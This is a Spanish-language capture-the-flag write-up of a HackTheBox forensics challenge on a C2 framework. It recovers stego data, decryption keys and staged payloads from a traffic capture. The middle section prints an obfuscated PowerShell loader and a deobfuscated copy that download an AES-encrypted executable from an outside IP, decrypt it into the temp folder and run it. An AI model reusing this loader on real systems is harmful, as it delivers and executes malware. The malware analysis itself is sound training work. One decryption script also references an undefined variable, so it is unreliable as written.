---
title: Interstallar C2
description: >
  HackTheBox Forensics Challenge - Medium<br>
  [Challenge Download](https://app.hackthebox.com/challenges/474)
date: 2024-05-08
weight: 10
tags: ["htb","forensics","medium", "stego", "crypto"]
---
---
# Enunciado del problema

We noticed some interesting traffic coming from outer space. An unknown group is using a Command and Control server. After an exhaustive investigation, we discovered they had infected multiple scientists from Pandora's private research lab. Valuable research is at risk. Can you find out how the server works and retrieve what was stolen?

---
# Resolución

Encontramos un objeto HTTP, que dentro tiene una cadena de texto en base64, y el source code lo exportamos a un archivo:

```powershell
$> cat base64.txt | base64 -d > something
$> file something
something: Dyalog APL version 113.-84
```

Encontramos esta web acerca de este tipo de archivo: https://help.dyalog.com/latest/Content/Language/APL%20Component%20Files/Component%20Files.htm

Haciendo un poco de zsteg en la imagen vemos lo siguiente:

```powershell
[?] 1125 bytes of extra data after image end (IEND), offset = 0x1c7
extradata:0         ..
    00000000: 2e 2e 2e 2e 2e 73 2e 2e  2e 2e 2e 2e 2e 2e 2e 2e  |.....s..........|
    00000010: 73 2e 2e 2e 2e 2e 2e 2e  2e 2e 2e 2e 2e 2e 2e 2e  |s...............|
    00000020: 2e 2e 2e 2e 2e 2e 2e 2e  63 2e 2e 2e 2e 2e 79 2e  |........c.....y.|
    00000030: 2e 2e 2e 2e 73 54 2e 2e  79 2e 2e 2e 2e 2e 2e 73  |....sT..y......s|
    00000040: 40 2e 2e 2e 2e 66 2e 40  2e 2e 2e 2e 2e 2e 54 2e  |@....f.@......T.|
    00000050: 2e 2e 2e 2e 2e 2e 2e 73  2e 63 2e 2e 2e 2e 2e 2e  |.......s.c......|
    00000060: 2e 2e 2e 2e 2e 2e 2e 2e  2e 2e 2e 2e 2e 2e 2e 79  |...............y|
    00000070: 66 2e 2e 2e 2e 2e 2e 2e  2e 2e 2e 2e 2e 2e 2e 2e  |f...............|
    00000080: 2e 63 73 73 2e 2e 2e 73  2e 2e 2e 2e 2e 2e 2e 2e  |.css...s........|
    00000090: 2e 79 2e 66 66 2e 2e 2e  2e 63 2e 2e 2e 2e 2e 2e  |.y.ff....c......|
    000000a0: 2e 79 2e 2e 2e 2e 2e 2e  40 40 2e 2e 2e 2e 2e 2e  |.y......@@......|
    000000b0: 2e 2e 2e 2e 66 2e 2e 2e  2e 2e 2e 2e 2e 2e 2e 2e  |....f...........|
    000000c0: 63 2e 40 2e 54 2e 2e 40  2e 2e 2e 2e 2e 2e 2e 2e  |c.@.T..@........|
    000000d0: 2e 2e 2e 2e 40 2e 2e 2e  2e 2e 79 2e 2e 2e 2e 2e  |....@.....y.....|
    000000e0: 2e 2e 2e 2e 2e 2e 2e 2e  2e 79 54 2e 2e 2e 2e 2e  |.........yT.....|
    000000f0: 2e 2e 2e 2e 2e 2e 2e 2e  2e 2e 2e 40 2e 2e 2e 73  |...........@...s|
b1,b,lsb,xy         .. file: MPEG ADTS, layer II, v2,  24 kbps, Monaural
b2,r,lsb,xy         .. text: "UU}UNU_UUT"
b2,g,msb,xy         .. text: "WUTUSL\\qU"
b2,b,msb,xy         .. text: "WU[U[%TyU9U"
b4,r,lsb,xy         .. text: "UUUUUUUR"
b4,g,lsb,xy         .. text: "&fffffffc"
b4,g,msb,xy         .. text: "effffff)"
b4,b,lsb,xy         .. text: "U333335\n"
b4,b,msb,xy         .. text: "ZUUUUUUUe"
```

Con exiftool vemos que tiene un binario en su interior:

```powershell
Palette                         : (Binary data 96 bytes, use -b option to extract)
```

Al intentar extraerlo nos sale un error:

```powershell
$> exiftool image.png -b
Warning: [minor] Trailer data after PNG IEND chunk - image.png
12.57image.png.15802024:05:13 17:30:30+02:002024:05:13 17:34:26+02:002024:05:13 17:34:26+02:00100777PNGPNGimage/png30308300056:������PQT������:;?������������������aad���lmpBCF�����ݸ��}~�xy|IJMZ[^������DEI���efiqru������[minor] Trailer data after PNG IEND chunk30 300.0009%
```

Para final con el escaneo básico vemos el contenido del archivo de powershell:

```powershell
  .("{1}{0}{2}" -f'T','Set-i','em') ('vAriA'+'ble'+':q'+'L'+'z0so')  ( [tYpe]("{0}{1}{2}{3}" -F'SySTEM.i','o.Fi','lE','mode')) ;  &("{0}{2}{1}" -f'set-Vari','E','ABL') l60Yu3  ( [tYPe]("{7}{0}{5}{4}{3}{1}{2}{6}"-F'm.','ph','Y.ae','A','TY.crypTOgR','SeCuRi','S','sYSte'));  .("{0}{2}{1}{3}" -f 'Set-V','i','AR','aBle')  BI34  (  [TyPE]("{4}{7}{0}{1}{3}{2}{8}{5}{10}{6}{9}" -f 'TEm.secU','R','Y.CrY','IT','s','Y.','D','yS','pTogrAPH','E','CrypTOSTReAmmo'));  ${U`Rl} = ("{0}{4}{1}{5}{8}{6}{2}{7}{9}{3}"-f 'htt','4f0','53-41ab-938','d8e51','p://64.226.84.200/9497','8','58','a-ae1bd8','-','6')
${P`TF} = "$env:temp\94974f08-5853-41ab-938a-ae1bd86d8e51"
.("{2}{1}{3}{0}"-f'ule','M','Import-','od') ("{2}{0}{3}{1}"-f 'r','fer','BitsT','ans')
.("{4}{5}{3}{1}{2}{0}"-f'r','-BitsT','ransfe','t','S','tar') -Source ${u`Rl} -Destination ${p`Tf}
${Fs} = &("{1}{0}{2}" -f 'w-Ob','Ne','ject') ("{1}{2}{0}"-f 'eam','IO.','FileStr')(${p`Tf},  ( &("{3}{1}{0}{2}" -f'lDIt','hi','eM','c')  ('VAria'+'blE'+':Q'+'L'+'z0sO')).VALue::"oP`eN")
${MS} = .("{3}{1}{0}{2}"-f'c','je','t','New-Ob') ("{5}{3}{0}{2}{4}{1}" -f'O.Memor','eam','y','stem.I','Str','Sy');
${a`es} =   (&('GI')  VARiaBLe:l60Yu3).VAluE::("{1}{0}" -f'reate','C').Invoke()
${a`Es}."KE`Y`sIZE" = 128
${K`EY} = [byte[]] (0,1,1,0,0,1,1,0,0,1,1,0,1,1,0,0)
${iv} = [byte[]] (0,1,1,0,0,0,0,1,0,1,1,0,0,1,1,1)
${a`ES}."K`EY" = ${K`EY}
${A`es}."i`V" = ${i`V}
${cS} = .("{1}{0}{2}"-f'e','N','w-Object') ("{4}{6}{2}{9}{1}{10}{0}{5}{8}{3}{7}" -f 'phy.Crypto','ptogr','ecuri','rea','Syste','S','m.S','m','t','ty.Cry','a')(${m`S}, ${a`Es}.("{0}{3}{2}{1}" -f'Cre','or','pt','ateDecry').Invoke(),   (&("{1}{2}{0}"-f 'ARIaBLE','Ge','T-V')  bI34  -VaLue )::"W`RItE");
${f`s}.("{1}{0}"-f 'To','Copy').Invoke(${Cs})
${d`ecD} = ${M`s}.("{0}{1}{2}"-f'T','oAr','ray').Invoke()
${C`S}.("{1}{0}"-f 'te','Wri').Invoke(${d`ECD}, 0, ${d`ECd}."LENg`TH");
${D`eCd} | .("{2}{3}{1}{0}" -f'ent','t-Cont','S','e') -Path "$env:temp\tmp7102591.exe" -Encoding ("{1}{0}"-f 'yte','B')
& "$env:temp\tmp7102591.exe"
```

Y lo deobfuscamos un poco manualmente y con ayuda de este script en python:

```python
>>> def completar_secuencia(secuencia, palabras):
...     indice_palabras = [palabras[int(indice)] for indice in secuencia.strip('{}').split('}{')]
...     secuencia_completa = ''.join(indice_palabras)
...     return secuencia_completa
```

![](https://raw.githubusercontent.com/yoshlsec/page-images/main/Challenges%20HTB%20Forensics/Pasted%20image%2020240513175814.png)

Código deobfuscado:

```powershell
.("Set-Item") ('variable:qLz0so') ([Type]('System.io.Filemode'));  
&('Set-Variable') l60Yu3 ([Type]('System.Security.Cryptography'));  
.('Set-Variable')  BI34 ([Type]('System.Security.Cryptography.Cryptostreammode'));  

${url} = 'http://64.226.84.200/94974f08-5853-41ab-938a-ae1bd86d8e51'
${ptf} = "$env:temp\94974f08-5853-41ab-938a-ae1bd86d8e51"
.('Import-Module')
('BitsTransfer').('Start-BitsTransfer') -Source ${url} -Destination ${ptf}

${Fs} = &('New-Object') ('io.FileStream')(${ptf},  ( &('childItem')  ('Variable:qLz0sO')).Value::"open")
${MS} = .('New-Object') ('System.IO.MemoryStream');
${aes} =   (&('GI')  VariabLe:l60Yu3).Value::('Create').Invoke()

${aes}."keysize" = 128
${key} = [byte[]] (0,1,1,0,0,1,1,0,0,1,1,0,1,1,0,0)
${iv} = [byte[]] (0,1,1,0,0,0,0,1,0,1,1,0,0,1,1,1)

${aes}."key" = ${key}
${aes}."iv" = ${iv}
${cs} = .('New-Object') ('System.Security.Cryptography.CryptoStream')(${ms}, ${aes}.('CreateDecryptor').Invoke(),   (&('Get-Variable'))  BI34  -Value )::"write");
${fs}.('CopyTo').Invoke(${cs})
${decd} = ${ms}.('ToArray').Invoke()
${cd}.('Write').Invoke(${decd}, 0, ${decd}."length");

${decd} | .('Set-Content') -Path "$env:temp\tmp7102591.exe" -Encoding ('Byte')
& "$env:temp\tmp7102591.exe"
```

El script esta descargando el archivo de un servidor web, donde lo descrifra utilizando las claves AES y IV para luego ejecutarlo en el directorio *tmp*, el archivo tambien lo podemos encontrar en la captura de wireshark:

![](https://raw.githubusercontent.com/yoshlsec/page-images/main/Challenges%20HTB%20Forensics/Pasted%20image%2020240513180342.png)

Con ayuda de chatGPT hacemos el siguiente código para obtener el verdadero archivo que estaba encriptado:

```python
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

def decrypt(data, key, iv):
    cipher = AES.new(key, AES.MODE_CBC, iv)
    return unpad(cipher.decrypt(data[0:]), AES.block_size)

key = [0,1,1,0,0,1,1,0,0,1,1,0,1,1,0,0]
iv = [0,1,1,0,0,0,0,1,0,1,1,0,0,1,1,1]


with open('ArchivoWeb','rb') as f:
    bytes = f.read()

with open('./ArchivoWeb.dec','wb') as f:
    f.write(decrypt(bytes, bytearray(key),bytearray(iv)))
```

Y obtenemos el siguiente ejecutable:

```powershell
$> file ArchivoWeb.dec
ArchivoWeb.dec: writable, executable, regular file, no read permission

$> chmod +r ArchivoWeb.dec
$> file ArchivoWeb.dec
ArchivoWeb.dec: PE32 executable (console) Intel 80386 Mono/.Net assembly, for MS Windows, 3 sections
```

Con eso sabemos que es un archivo **.NET**, como ida no nos funcionaba, busque en google que herramientas me podían ayudar y encontre: **dnSpy**, viendo por encima el archivo me llamo la antención un modulo...
donde nos muestran una key y un archivo, y poco despues vi que lo encriptaban:

![](https://raw.githubusercontent.com/yoshlsec/page-images/main/Challenges%20HTB%20Forensics/Pasted%20image%2020240513234124.png)

Aquí lo más importante:

```powershell
string key = "DGCzi057IDmHvgTVE2gm60w8quqfpMD+o8qCBGpYItc=";
string address = "Anni?Theda=Merrilee?c";

Program.Encryption(key, un, false, null)).DownloadString(address)
```

Asique creamos un código de python para desencriptar el archivo que también lo podemos sacar del wireshark:

```python
import base64
from Crypto.Cipher import AES


def decrypt(data, key):
    cipher = AES.new(key, AES.MODE_CBC, data[:AES.block_size])
    return cipher.decrypt(data[AES.block_size:])

key = base64.b64decode("DGCzi057IDmHvgTVE2gm60w8quqfpMD+o8qCBGpYItc=")



with open('AnniMerrileec','rb') as f:
    file = f.read()
    
file = base64.b64decode(file)
file = decrypt(file,bytearray(key))
file = base64.b64decode(file.decode().strip('\x00'))

with open('./merrilee','wb') as f:
    f.write(blob)
```

Ejecutando el programa no nos muestra ningún error:

```powershell
PS C:\Users\yoshl\Documents\Retos\c2> dir .\AnniMerrilee

    Directory: C:\Users\yoshl\Documents\Retos\c2

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a---           5/13/2024 11:44 PM          12632 AnniMerrilee

PS C:\Users\yoshl\Documents\Retos\c2> python .\script.py
PS C:\Users\yoshl\Documents\Retos\c2> dir .\merrilee

	Directory: C:\Users\yoshl\Documents\Retos\c2

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a---           5/13/2024 11:46 PM           7079 merrilee

$> file merrilee
merrilee: ASCII text, with very long lines (4314)
```

Dentro de merrilee, vemos muchas cadenas en base64, pero vemos una en texto plano que nos llama la atención:

```powershell
KILLDATE16652025-01-015661ETADLLIK
SLEEP980013s10089PEELS
JITTER20250.25202RETTIJ
NEWKEY8839394nUbFDDJadpsuGML4Jxsq58nILvjoNu76u4FIHVGIKSQ=4939388YEKWEN
```

Y por lógica sacamos la key, porque `NEWKEY8839394` se repite al final de la linea pero en modo espejo:

```powershell
nUbFDDJadpsuGML4Jxsq58nILvjoNu76u4FIHVGIKSQ=
```

Al instalar uno de los archivos de wireshark me sale un *OpenPGP Public Key*:

```powershell
$> strings -n10 flag | base64 -d > flag2
base64: invalid input

$> file flag2
flag2: OpenPGP Public Key
```

En uno de los archivos nos aparecerá un png, recuerdo que todo este decrypt lo hice con el mismo script que el anterior, cambiando la clave AES.

![](https://raw.githubusercontent.com/yoshlsec/page-images/main/Challenges%20HTB%20Forensics/1%20z%20IyKrYPtgP3reQ3Uv3xlQ.webp)

En el que contendra la flag